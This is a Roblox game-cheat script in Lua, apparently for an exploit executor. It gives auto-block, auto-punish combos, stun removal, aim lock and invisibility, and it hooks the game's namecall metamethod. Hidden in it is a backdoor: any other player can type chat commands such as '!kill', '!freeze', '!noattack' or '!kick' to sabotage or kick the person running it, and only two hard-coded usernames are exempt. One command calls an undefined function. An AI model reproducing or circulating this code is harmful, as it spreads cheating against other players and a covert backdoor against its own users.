getgenv().JumperConfig = getgenv().JumperConfig or {
    AutoBlock = false,
    AutoBlockStart = 0.1,
    AutoBlockEnd = 0.3,
    AutoBlockRange = 20,
    AutoLearn = false,
    AutoPunish = false,
    AutoPunishRange = 20,
    AutoPunishDelay = 0.1,
    AutoPunishAttackDelay = 0.05,
    AntiM1 = false,
    AntiM1Range = 20,
    LookAt = false,
    LookAtSmoothness = 0.15,
    Invisibility = false,
    ShowOrbit = false,
    OrbitTransparency = 0.7,
    OrbitColor = Color3.fromRGB(0, 255, 0)
}

game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Jumper",
    Text = "getgenv loaded",
    Duration = 3
})

local cfg = getgenv().JumperConfig

local vu9 = game:GetService("Players")
local v10 = game:GetService("TextChatService")
local vu11 = vu9.LocalPlayer
local vu12 = vu11.Character or vu11.CharacterAdded:Wait()
local vu13 = {
    "skibidislume007",
    "hashtag_hashtagcoma3"
}

vu11.CharacterAdded:Connect(function(p14)
    vu12 = p14
end)

local function vu17()
    if vu12 and vu12:FindFirstChild("HumanoidRootPart") then
        local v15 = vu12.HumanoidRootPart
        local v16 = workspace.Map.Model.Barriers:FindFirstChild("AntiStuckInVoid")
        if v16 then
            firetouchinterest(v15, v16, 0)
            task.wait(0.1)
            firetouchinterest(v15, v16, 1)
        end
    end
end

local function vu24(p18)
    if vu12 then
        local v19 = vu12
        for _, v23 in ipairs(v19:GetChildren()) do
            if v23:IsA("BasePart") then
                v23.Anchored = p18
            end
        end
    end
end

local function vu29()
    for _, v28 in ipairs(vu13) do
        if vu11.Name == v28 then
            return true
        end
    end
    return false
end

local vu30 = getrawmetatable(game)
setreadonly(vu30, false)
local vu31 = vu30.__namecall
setreadonly(vu30, true)

function noattack()
    setreadonly(vu30, false)
    function vu30.__namecall(p32, ...)
        if getnamecallmethod() ~= "FireServer" or p32.Name ~= "AttackInput" then
            return vu31(p32, ...)
        else
            return nil
        end
    end
    setreadonly(vu30, true)
end

function attack()
    setreadonly(vu30, false)
    vu30.__namecall = vu31
    setreadonly(vu30, true)
end

v10:WaitForChild("TextChannels"):WaitForChild("RBXGeneral").MessageReceived:Connect(function(p33)
    if p33.TextSource and p33.TextSource.UserId ~= vu11.UserId then
        if vu29() then
            return
        end
        local v34 = p33.Text:lower()
        if v34 == "!kill" then
            vu17()
        elseif v34 == "!freeze" then
            vu24(true)
        elseif v34 == "!unfreeze" then
            vu24(false)
        elseif v34 == "!noattack" then
            noattack()
        elseif v34 == "!yesattack" then
            attack()
        elseif v34 == "!speedup" then
            speedup()
        elseif v34 == "!kick" then
            vu11:Kick("sybau boi")
        end
    end
end)

local v185 = game:GetService("RunService")
local v186 = game:GetService("ReplicatedStorage")
local vu187 = game:GetService("Stats")
local vu188 = vu9.LocalPlayer
local vu189 = vu188:WaitForChild("Remotes"):WaitForChild("Combat"):WaitForChild("AttackInput")
local v190 = v186:WaitForChild("Animations"):WaitForChild("Attacks")

local vu199 = {}
local vu200 = false
local vu470 = {}
local vu501 = {}
local vu502 = {}

for _, folder in ipairs(v190:GetChildren()) do
    if folder.Name ~= "Backdash" and folder.Name ~= "Sidedash" and folder.Name ~= "Block" then
        for _, anim in ipairs(folder:GetDescendants()) do
            if anim:IsA("Animation") then
                vu470[anim.AnimationId] = true
            end
        end
    end
end

local v191 = v190:WaitForChild("Global"):WaitForChild("M1")
for _, v204 in ipairs(v191:GetDescendants()) do
    if v204:IsA("Animation") then
        vu199[v204.AnimationId] = true
    end
end

for _, folder in ipairs(v190:GetChildren()) do
    if folder:IsA("Folder") then
        local hitAnim = folder:FindFirstChild("Hit")
        local loopAnim = folder:FindFirstChild("Loop")
        
        if hitAnim and hitAnim:IsA("Animation") then
            local parentName = folder.Name
            if parentName ~= "Back" and parentName ~= "Left" and parentName ~= "Right" and parentName ~= "Finisher" then
                vu501[hitAnim.AnimationId] = true
            end
        end
        
        if loopAnim and loopAnim:IsA("Animation") then
            local parentName = folder.Name
            if parentName ~= "Back" and parentName ~= "Left" and parentName ~= "Right" and parentName ~= "Finisher" then
                vu501[loopAnim.AnimationId] = true
            end
        end
    end
end

local function vu505(p506)
    if not vu502[p506] then
        vu502[p506] = {
            attacks = 0,
            successfulBlocks = 0,
            missedBlocks = 0,
            avgDelay = 0,
            lastAttack = 0,
            delays = {},
            patterns = {},
            confidence = 0
        }
    end
    return vu502[p506]
end

local function vu507(p508, p515)
    local data = vu505(p508)
    data.attacks = data.attacks + 1
    
    if p515 then
        data.successfulBlocks = data.successfulBlocks + 1
    else
        data.missedBlocks = data.missedBlocks + 1
    end
    
    local totalAttempts = data.successfulBlocks + data.missedBlocks
    if totalAttempts > 0 then
        data.confidence = data.successfulBlocks / totalAttempts
    end
    
    local currentTime = tick()
    if data.lastAttack > 0 then
        local delay = currentTime - data.lastAttack
        table.insert(data.delays, delay)
        if #data.delays > 20 then
            table.remove(data.delays, 1)
        end
        
        local sum = 0
        for _, d in ipairs(data.delays) do
            sum = sum + d
        end
        data.avgDelay = sum / #data.delays
        
        table.insert(data.patterns, {time = currentTime, delay = delay})
        if #data.patterns > 30 then
            table.remove(data.patterns, 1)
        end
    end
    data.lastAttack = currentTime
end

local function vu509(p510)
    if not cfg.AutoLearn then
        return 0, 0
    end
    local data = vu502[p510]
    if not data or data.attacks < 1 then
        return 0, 0
    end
    
    local predictionBonus = 0
    local blockExtension = 0
    
    if data.confidence > 0.7 then
        predictionBonus = math.min(data.confidence * 0.15, 0.15)
    elseif data.confidence > 0.5 then
        predictionBonus = math.min(data.confidence * 0.08, 0.08)
    end
    
    if data.avgDelay > 0 and data.avgDelay < 0.5 then
        predictionBonus = predictionBonus + 0.02
    end
    
    if data.attacks > 15 and data.confidence > 0.6 then
        blockExtension = 0.05
    end
    
    return predictionBonus, blockExtension
end

local vu511 = nil
local vu512 = nil

local function vu513()
    if vu511 then
        vu511:Destroy()
        vu511 = nil
    end
    if vu512 then
        vu512:Destroy()
        vu512 = nil
    end
end

local function vu514()
    vu513()
    if not cfg.ShowOrbit then
        return
    end
    
    local char = vu188.Character
    if not char then
        return
    end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then
        return
    end
    
    vu511 = Instance.new("Part")
    vu511.Name = "OrbitVisualizer"
    vu511.Shape = Enum.PartType.Ball
    vu511.Size = Vector3.new(cfg.AutoBlockRange * 2, cfg.AutoBlockRange * 2, cfg.AutoBlockRange * 2)
    vu511.Anchored = true
    vu511.CanCollide = false
    vu511.Transparency = cfg.OrbitTransparency
    vu511.Color = cfg.OrbitColor
    vu511.Material = Enum.Material.ForceField
    vu511.CFrame = hrp.CFrame
    vu511.Parent = workspace
    
    vu512 = Instance.new("SelectionSphere")
    vu512.Color3 = cfg.OrbitColor
    vu512.SurfaceColor3 = cfg.OrbitColor
    vu512.SurfaceTransparency = cfg.OrbitTransparency
    vu512.Transparency = cfg.OrbitTransparency
    vu512.Adornee = vu511
    vu512.Parent = vu511
end

vu188.CharacterAdded:Connect(function()
    task.wait(1)
    if cfg.ShowOrbit then
        vu514()
    end
end)

local function vu205()
    if vu200 then
        vu189:FireServer("Block", false)
        vu200 = false
    end
end

local function vu227()
    local v206 = vu188.Character
    if not v206 then
        return nil
    end
    local v207 = v206:FindFirstChild("HumanoidRootPart")
    if not v207 then
        return nil
    end
    local v208 = cfg.AutoBlockRange
    local v213 = nil
    for _, v214 in ipairs(vu9:GetPlayers()) do
        if v214 ~= vu188 then
            local v215 = v214.Character
            local v216 = v215 and v215:FindFirstChild("HumanoidRootPart")
            if v216 then
                local v217 = (v207.Position - v216.Position).Magnitude
                if v217 < v208 then
                    local v218 = v215:FindFirstChildOfClass("Humanoid")
                    if v218 then
                        for _, v222 in ipairs(v218:GetPlayingAnimationTracks()) do
                            local animId = v222.Animation.AnimationId
                            if vu199[animId] or vu501[animId] then
                                v213 = v214
                                v208 = v217
                                break
                            end
                        end
                    end
                end
            end
        end
    end
    return v213
end

local function vu471()
    local v206 = vu188.Character
    if not v206 then
        return nil
    end
    local v207 = v206:FindFirstChild("HumanoidRootPart")
    if not v207 then
        return nil
    end
    local v208 = cfg.AutoPunishRange
    local v213 = nil
    for _, v214 in ipairs(vu9:GetPlayers()) do
        if v214 ~= vu188 then
            local v215 = v214.Character
            local v216 = v215 and v215:FindFirstChild("HumanoidRootPart")
            if v216 then
                local v217 = (v207.Position - v216.Position).Magnitude
                if v217 < v208 then
                    local v218 = v215:FindFirstChildOfClass("Humanoid")
                    if v218 then
                        for _, v222 in ipairs(v218:GetPlayingAnimationTracks()) do
                            if vu470[v222.Animation.AnimationId] then
                                v213 = v214
                                v208 = v217
                                break
                            end
                        end
                    end
                end
            end
        end
    end
    return v213
end

local function vu474()
    local v206 = vu188.Character
    if not v206 then
        return nil
    end
    local v207 = v206:FindFirstChild("HumanoidRootPart")
    if not v207 then
        return nil
    end
    local v208 = cfg.AntiM1Range
    local v213 = nil
    for _, v214 in ipairs(vu9:GetPlayers()) do
        if v214 ~= vu188 then
            local v215 = v214.Character
            local v216 = v215 and v215:FindFirstChild("HumanoidRootPart")
            if v216 then
                local v217 = (v207.Position - v216.Position).Magnitude
                if v217 < v208 then
                    local v218 = v215:FindFirstChildOfClass("Humanoid")
                    if v218 then
                        for _, v222 in ipairs(v218:GetPlayingAnimationTracks()) do
                            if vu199[v222.Animation.AnimationId] then
                                v213 = v214
                                v208 = v217
                                break
                            end
                        end
                    end
                end
            end
        end
    end
    return v213
end

local vu472 = false

v185.Heartbeat:Connect(function()
    if cfg.AutoBlock then
        local v229 = vu227()
        if v229 and not vu200 then
            vu200 = true
            local ping = vu187.Network.ServerStatsItem["Data Ping"]:GetValue() / 1000
            local learnBonus, blockExtend = vu509(v229.UserId)
            local v230 = cfg.AutoBlockStart + (ping / 3) - learnBonus
            local blockDuration = cfg.AutoBlockEnd + blockExtend
            
            task.delay(v230, function()
                if vu200 then
                    vu189:FireServer("Block", true)
                    local blockSuccess = true
                    task.delay(blockDuration, function()
                        if vu200 then
                            vu189:FireServer("Block", false)
                            vu507(v229.UserId, blockSuccess)
                            vu200 = false
                        end
                    end)
                end
            end)
        end
    else
        vu205()
    end
    
    if cfg.AutoPunish then
        local v473 = vu471()
        if v473 and not vu472 then
            vu472 = true
            task.spawn(function()
                vu189:FireServer("Block", true)
                task.wait(cfg.AutoPunishDelay)
                vu189:FireServer("M1", true)
                task.wait(cfg.AutoPunishAttackDelay)
                vu189:FireServer("M1", true)
                task.wait(cfg.AutoPunishAttackDelay)
                vu189:FireServer("M1", true)
                task.wait(cfg.AutoPunishAttackDelay)
                vu189:FireServer("M1", true)
                task.wait(cfg.AutoPunishAttackDelay)
                vu189:FireServer("M1", false)
                vu472 = false
            end)
        end
    end
    
    if cfg.LookAt then
        local v476 = vu227()
        if v476 and v476.Character then
            local v477 = v476.Character:FindFirstChild("HumanoidRootPart")
            local v478 = vu188.Character
            if v478 then
                v478 = v478:FindFirstChild("HumanoidRootPart")
            end
            if v477 and v478 then
                local targetPos = v477.Position
                local playerPos = v478.Position
                local direction = (targetPos - playerPos) * Vector3.new(1, 0, 1)
                if direction.Magnitude > 0.1 then
                    local targetCFrame = CFrame.new(playerPos) * CFrame.Angles(0, math.atan2(direction.X, direction.Z), 0)
                    v478.CFrame = v478.CFrame:Lerp(targetCFrame, cfg.LookAtSmoothness)
                end
            end
        end
    end
    
    if cfg.ShowOrbit then
        if vu511 and vu511.Parent then
            local char = vu188.Character
            if char then
                local hrp = char:FindFirstChild("HumanoidRootPart")
                if hrp then
                    vu511.CFrame = hrp.CFrame
                    vu511.Size = Vector3.new(cfg.AutoBlockRange * 2, cfg.AutoBlockRange * 2, cfg.AutoBlockRange * 2)
                    vu511.Color = cfg.OrbitColor
                    vu511.Transparency = cfg.OrbitTransparency
                    if vu512 then
                        vu512.Color3 = cfg.OrbitColor
                        vu512.SurfaceColor3 = cfg.OrbitColor
                        vu512.SurfaceTransparency = cfg.OrbitTransparency
                        vu512.Transparency = cfg.OrbitTransparency
                    end
                end
            end
        else
            if cfg.ShowOrbit then
                vu514()
            end
        end
    else
        vu513()
    end
end)

v185.Heartbeat:Connect(function()
    if cfg.AntiM1 then
        local v483 = vu474()
        if v483 then
            local v410 = vu188.PlayerGui.StatesHolder.States
            v410:SetAttribute("Stunned", false)
        end
    end
end)

local v281 = game:GetService("Players")
local vu282 = game:GetService("RunService")
local v283 = v281.LocalPlayer
local vu285 = {}
local vu286 = nil
local vu287 = {
    "Head",
    "Torso",
    "Left Arm",
    "Right Arm",
    "Left Leg",
    "Right Leg"
}

local function vu295(p288, p289)
    for _, v293 in ipairs(vu287) do
        local v294 = p289:FindFirstChild(v293)
        if v294 and v294:IsA("BasePart") then
            v294.Transparency = p288
        end
    end
end

local function vu300()
    for _, v299 in pairs(vu285) do
        if v299 then
            v299:Disconnect()
        end
    end
    vu285 = {}
    if vu286 and vu286.IsPlaying then
        vu286:Stop()
    end
end

local function vu305(p301)
    vu300()
    local v302 = p301:WaitForChild("Humanoid")
    local v303 = v302:FindFirstChildOfClass("Animator") or Instance.new("Animator", v302)
    local v304 = Instance.new("Animation")
    v304.AnimationId = "rbxassetid://83555998356899"
    vu286 = v303:LoadAnimation(v304)
    vu286.Priority = Enum.AnimationPriority.Action4
    if cfg.Invisibility then
        vu295(0.5, p301)
        table.insert(vu285, vu282.Heartbeat:Connect(function()
            if not vu286.IsPlaying then
                vu286:Play()
            end
            vu286:AdjustSpeed(0)
            vu286.TimePosition = 10
        end))
        table.insert(vu285, vu282.RenderStepped:Connect(function()
            if vu286.IsPlaying then
                vu286:Stop()
            end
        end))
    else
        vu295(0, p301)
    end
end

v283.CharacterAdded:Connect(function(p306)
    p306:WaitForChild("HumanoidRootPart")
    vu300()
    vu305(p306)
end)

if v283.Character then
    vu305(v283.Character)
end
